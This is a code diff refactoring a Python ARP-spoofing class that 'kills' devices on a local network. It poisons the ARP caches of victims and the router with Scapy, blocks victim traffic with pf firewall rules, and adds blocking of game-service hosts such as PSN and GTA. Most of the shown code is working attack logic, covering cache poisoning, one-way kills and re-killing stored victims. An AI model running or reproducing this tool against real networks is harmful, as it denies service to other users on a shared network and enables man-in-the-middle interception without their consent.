@@ -1,93 +1,114 @@
+"""ARP spoofing (kill/unkill) and MITM forwarder management."""
+import logging
 from scapy.all import ARP, Ether, conf
 from time import sleep
 import sys
 import subprocess
+import threading
+from typing import Optional
 
-from networking.forwarder import MitmForwarder
-from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
+from networking.hostblock import HostBlocklist
+from tools.firewall import block_all_for, unblock_all_for
 from tools.utils import threaded, get_default_iface
-from constants import *
+from constants import DUMMY_ROUTER
+
+log = logging.getLogger(__name__)
 
 
-def enable_ip_forwarding():
-    """Enable kernel-level IP forwarding for fast packet forwarding."""
-    try:
-        if sys.platform == 'darwin':
-            # macOS
-            subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=1'], 
-                         capture_output=True, check=False)
-        elif sys.platform.startswith('linux'):
-            # Linux
-            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
-                         capture_output=True, check=False)
-        # Windows: IP forwarding requires registry changes, skip for now
-    except Exception:
-        pass
+def enable_ip_forwarding() -> bool:
+    """Turn on kernel IP forwarding so selective blocks forward allowed traffic.
+
+    macOS/Linux use a sysctl. Windows has no sysctl equivalent for ARP-MITM'd
+    traffic; that path will use WinDivert once implemented (see build/privilege
+    specs).
+    """
+    if sys.platform == 'darwin':
+        key = 'net.inet.ip.forwarding'
+    elif sys.platform.startswith('linux'):
+        key = 'net.ipv4.ip_forward'
+    else:
+        return False
+    res = subprocess.run(['sysctl', '-w', f'{key}=1'], capture_output=True, check=False)
+    return res.returncode == 0
 
 
 class Killer:
-    def __init__(self, router=DUMMY_ROUTER):
+    """ARP spoofer that kills/unkills network devices.
+
+    Manages a persistent L2 socket to avoid socket exhaustion on Windows.
+    Callers should invoke ``unkill_all()`` before discarding the instance,
+    or rely on ``__del__`` for best-effort cleanup.
+    """
+
+    def __init__(self, router: dict[str, object] = DUMMY_ROUTER) -> None:
         self.iface = get_default_iface()
         # Use guid (Scapy/pcap name) for conf.iface, not friendly name
         conf.iface = self.iface.guid if self.iface.guid else self.iface.name
-        # Enable kernel IP forwarding for fast MITM
+        # Kernel IP forwarding so selective blocks can forward the allowed traffic.
         enable_ip_forwarding()
-        self.router = router
-        self.killed = {}
-        self.storage = {}
-        self.forwarders = {}
-        self.pf_blocks = set()
-        self._socket = None  # Persistent L2 socket
+        self.router: dict[str, object] = router
+        self.killed: dict[str, dict[str, object]] = {}
+        self.storage: dict[str, dict[str, object]] = {}
+        self.pf_blocks: set[str] = set()
+        self._socket: Optional[object] = None  # Persistent L2 socket
+        self._lock: threading.Lock = threading.Lock()  # Guards killed, forwarders, pf_blocks
+        # Host-domain blocklist (PSN, GTA, …) over the firewall module.
+        self.hostblock = HostBlocklist()
+
+    def __del__(self) -> None:
+        """Best-effort cleanup — close socket if still open."""
+        self._close_socket()
     
-    def _get_socket(self):
-        """Get or create persistent L2 socket - prevents Windows socket exhaustion"""
+    def _get_socket(self) -> Optional[object]:
+        """Get or create persistent L2 socket — prevents Windows socket exhaustion."""
         if self._socket is None:
             try:
                 iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
                 self._socket = conf.L2socket(iface=iface)
-            except Exception:
+            except OSError as e:
+                log.warning('Failed to create L2 socket on %s: %s', self.iface.name, e)
                 self._socket = None
         return self._socket
     
-    def _send_packet(self, packet):
-        """Send packet using persistent socket, fallback to new socket if needed"""
+    def _send_packet(self, packet: object) -> None:
+        """Send packet using persistent socket, fallback to new socket if needed."""
         sock = self._get_socket()
         if sock:
             try:
                 sock.send(packet)
                 return
-            except Exception:
-                # Socket died, recreate
+            except OSError as e:
+                log.debug('L2 socket send failed, recreating: %s', e)
                 self._close_socket()
-        
+
         # Fallback: direct send (creates new socket)
         try:
             from scapy.all import sendp
             iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
             sendp(packet, iface=iface, verbose=0)
-        except Exception:
-            pass
+        except OSError as e:
+            log.warning('Fallback sendp failed for %s: %s', self.iface.name, e)
     
-    def _close_socket(self):
-        """Close persistent socket"""
+    def _close_socket(self) -> None:
+        """Close persistent socket safely."""
         if self._socket:
             try:
                 self._socket.close()
-            except Exception:
-                pass
+            except OSError as e:
+                log.debug('Socket close error (ignoring): %s', e)
             self._socket = None
     
     @threaded
-    def kill(self, victim, wait_after=2):
+    def kill(self, victim: dict[str, object], wait_after: int = 2) -> None:
         """
         Spoofing victim.
         Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
         Prevents Windows NDIS throttling.
         """
-        if victim['mac'] in self.killed:
-            return
-        
-        self.killed[victim['mac']] = victim
+        with self._lock:
+            if victim['mac'] in self.killed:
+                return
+            self.killed[victim['mac']] = victim
 
         # Send ARP reply (is-at) with proper Ethernet destination to poison caches
         # Unicast to specific MAC, not broadcast - avoids switch storm detection
@@ -117,15 +138,14 @@ class Killer:
             self._send_packet(to_router)
             sleep(wait_after)
 
-        self._stop_forwarder(victim['mac'])
-
     @threaded
-    def unkill(self, victim):
+    def unkill(self, victim: dict[str, object]) -> None:
         """
         Unspoofing victim
         """
-        if victim['mac'] in self.killed:
-            self.killed.pop(victim['mac'])
+        with self._lock:
+            if victim['mac'] in self.killed:
+                self.killed.pop(victim['mac'])
 
         # Restore Victim and Router with correct mappings
         to_victim = Ether(dst=victim['mac'])/ARP(
@@ -150,10 +170,9 @@ class Killer:
                 self._send_packet(to_victim)
                 self._send_packet(to_router)
                 sleep(0.1)
-        self._stop_forwarder(victim['mac'])
         self._remove_pf_block(victim['ip'])
 
-    def kill_all(self, device_list):
+    def kill_all(self, device_list: list[dict[str, object]]) -> None:
         """
         Safely kill all devices
         """
@@ -163,31 +182,31 @@ class Killer:
             if device['mac'] not in self.killed:
                 self.kill(device)
 
-    def unkill_all(self):
+    def unkill_all(self) -> None:
         """
         Safely unkill all devices killed previously
         """
-        for mac in list(self.killed):
-            self.killed.pop(mac)
-            self._stop_forwarder(mac)
-        for ip in list(self.pf_blocks):
-            self._remove_pf_block(ip)
+        with self._lock:
+            for mac in list(self.killed):
+                self.killed.pop(mac)
+            for ip in list(self.pf_blocks):
+                self._remove_pf_block(ip)
         # Close persistent socket when done
         self._close_socket()
     
-    def store(self):
+    def store(self) -> None:
         """
         Save a copy of previously killed devices
         """
         self.storage = dict(self.killed)
     
-    def release(self):
+    def release(self) -> None:
         """
         Remove the stored copy of killed devices
         """
         self.storage = {}
     
-    def rekill_stored(self, new_devices):
+    def rekill_stored(self, new_devices: list[dict[str, object]]) -> None:
         """
         Re-kill old devices in self.storage
         """
@@ -204,7 +223,7 @@ class Killer:
 
             self.kill(old)
 
-    def one_way_kill(self, victim):
+    def one_way_kill(self, victim: dict[str, object]) -> None:
         """
         Kill victim and block their outbound traffic.
         Uses kernel IP forwarding + pf block (fast, no Python overhead).
@@ -226,53 +245,36 @@ class Killer:
         # Block outbound at kernel level with pf (no slow Python forwarder)
         self._enforce_pf_block(victim['ip'])
 
-    def _start_one_way_forwarder(self, victim, debug=False):
-        if victim['mac'] in self.forwarders:
-            self.forwarders[victim['mac']].stop()
-        if not self.router.get('mac'):
-            if debug:
-                print(f"[killer] Cannot start forwarder: router MAC unknown")
-            return
-        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
-        if not iface_to_use or iface_to_use == 'NULL':
-            if debug:
-                print(f"[killer] Cannot start forwarder: invalid interface")
-            return
-        fw = MitmForwarder(debug=debug)
-        fw.start(
-            victim=victim,
-            router=self.router,
-            iface_name=iface_to_use,
-            iface_mac=self.iface.mac,
-            drop_from_victim=True,
-            drop_to_victim=False,
-        )
-        self.forwarders[victim['mac']] = fw
-        if debug:
-            print(f"[killer] Forwarder started for {victim['ip']}")
-    
-    def get_forwarder_stats(self, mac):
-        """Get stats for a specific forwarder"""
-        fw = self.forwarders.get(mac)
-        if fw:
-            return fw.get_stats()
-        return None
-
-    def _stop_forwarder(self, mac):
-        fw = self.forwarders.pop(mac, None)
-        if fw:
-            fw.stop()
-
-    def _enforce_pf_block(self, victim_ip: str):
+    def _enforce_pf_block(self, victim_ip: str) -> None:
         if victim_ip in self.pf_blocks:
             return
-        if ensure_pf_enabled() and install_anchor():
-            if block_all_for(self.iface.name, victim_ip):
-                self.pf_blocks.add(victim_ip)
+        if block_all_for(self.iface.name, victim_ip):  # self-ensures pf/anchor
+            self.pf_blocks.add(victim_ip)
 
-    def _remove_pf_block(self, victim_ip: str):
+    def _remove_pf_block(self, victim_ip: str) -> None:
         if victim_ip not in self.pf_blocks:
             return
-        if ensure_pf_enabled() and install_anchor():
-            unblock_all_for(victim_ip)
+        unblock_all_for(victim_ip)
         self.pf_blocks.discard(victim_ip)
+
+    # -- host / domain blocking (PSN, GTA, …) --------------------------------
+
+    def block_host(self, target: object, iface: Optional[str] = None) -> object:
+        """Block a curated preset key, domain, or IP (idempotent).
+
+        ``target`` may be a preset key ('psn-comms', 'gta-save'), a bare domain,
+        an IP, or an iterable of those. Returns a ``BlockResult``.
+        """
+        return self.hostblock.block(target, iface or self.iface.name)  # type: ignore[arg-type]
+
+    def unblock_host(self, key: str) -> bool:
+        """Remove exactly the IPs a previous ``block_host`` installed for ``key``."""
+        return self.hostblock.unblock(key)
+
+    def refresh_hosts(self, iface: Optional[str] = None) -> object:
+        """Re-resolve active host blocks and reconcile firewall rules (IP rotation)."""
+        return self.hostblock.refresh(iface or self.iface.name)
+
+    def active_host_blocks(self) -> dict:
+        """Map of active host-block key → currently-blocked IPs."""
+        return self.hostblock.active()
